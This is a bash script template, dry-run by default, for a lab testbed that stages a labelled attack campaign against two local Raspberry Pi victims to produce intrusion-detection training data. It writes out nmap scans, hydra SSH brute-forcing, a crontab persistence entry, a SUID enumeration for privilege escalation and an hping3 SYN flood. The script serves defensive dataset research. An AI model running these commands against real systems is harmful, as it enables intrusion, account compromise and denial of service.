#!/bin/bash
# campaign_example.sh -- TEMPLATE for one scripted, fully-labelled attack campaign.
# Runs on the attacker node (RPi5 hub = chrony master). DRY-RUN BY DEFAULT: it
# prints the timeline and does nothing until you pass EXECUTE=1 *and* the M3
# no-malware/silo-balanced roadmap gate + benign-overlap audit have passed.
#
# The campaign structure is the methodology:
#   1. QUIESCENT BASELINE  (no run_action -> pure benign windows)
#   2. STAGED ACTIONS      (each wrapped by run_action -> one labelled interval)
#   3. QUIESCENT BASELINE  (benign tail)
# Every stage targets a VICTIM by hostname; run_action stamps master-clock
# start/end into labels.csv. align_windows then interval-joins victim silos.
#
# Tools are TOOL-BASED, NO live malware (charter): nmap (recon), hydra
# (bruteforce), hping3 (ddos/flood), ettercap (mitm). Host-silo stages
# (persistence/privesc) run ON the victim over SSH so auditd/journald see them.
set -u
SCEN="${1:-C00}"
RUN="${2:-0}"
OUT="${OUT:-$HOME/campaigns/$SCEN}"
V1="${V1:-rpi3b1}"; V1_IP="${V1_IP:-192.168.0.32}"
V2="${V2:-rpi3b2}"; V2_IP="${V2_IP:-192.168.0.33}"
BASELINE_S="${BASELINE_S:-120}"
HERE="$(cd "$(dirname "$0")" && pwd)"
RA="$HERE/run_action.sh"

run() {  # stage target ip -- cmd...
  local stage="$1" atype="$2" tgt="$3"; shift 3
  [ "$1" = "--" ] && shift
  if [ "${EXECUTE:-0}" = "1" ]; then
    "$RA" "$OUT" "$SCEN" "$RUN" "$atype" "$stage" "$tgt" -- "$@"
  else
    echo "  DRY  [$stage/$atype -> $tgt]  $*"
  fi
}
baseline() {  # seconds
  if [ "${EXECUTE:-0}" = "1" ]; then sleep "$1"; else echo "  DRY  baseline ${1}s (quiescent -> benign windows)"; fi
}

echo "== campaign $SCEN run $RUN  (EXECUTE=${EXECUTE:-0})  out=$OUT =="
mkdir -p "$OUT"

# 1) benign baseline ---------------------------------------------------------
baseline "$BASELINE_S"

# 2) staged kill-chain against V1 -------------------------------------------
#    recon: TCP SYN scan (conn.log floods S0/REJ; weird.log)
run recon      recon       "$V1" -- nmap -sS -T3 -p1-1024 "$V1_IP"
#    recon: service/version sweep
run recon      recon       "$V1" -- nmap -sV -T3 --top-ports 50 "$V1_IP"
baseline 30
#    bruteforce: SSH password guessing (journald sshd-session auth_fail flood)
run bruteforce bruteforce  "$V1" -- hydra -l pi -P /opt/wordlists/small.txt -t4 -f "ssh://$V1_IP"
baseline 30
#    persistence: ON the victim (auditd tb_persist/tb_identity fire) -- SSH in.
run persistence persistence "$V1" -- ssh -i "$HOME/.ssh/obj3_testbed" "pi@$V1_IP" \
     'crontab -l 2>/dev/null | { cat; echo "*/5 * * * * /tmp/.probe"; } | crontab -'
#    privesc: sudo/setuid probe on the victim (auditd tb_priv)
run privesc    privesc     "$V1" -- ssh -i "$HOME/.ssh/obj3_testbed" "pi@$V1_IP" \
     'sudo -n id; find / -perm -4000 -type f 2>/dev/null | head'
baseline 30
#    ddos: SYN flood (telemetry CPU/thermal + conn.log burst)
run ddos       ddos        "$V1" -- hping3 -S --flood -p 22 "$V1_IP"

# 3) benign tail -------------------------------------------------------------
baseline "$BASELINE_S"
echo "== campaign $SCEN run $RUN complete =="
[ "${EXECUTE:-0}" = "1" ] && echo "labels -> $OUT/labels.csv ; evidence -> $OUT/actions.jsonl"
exit 0
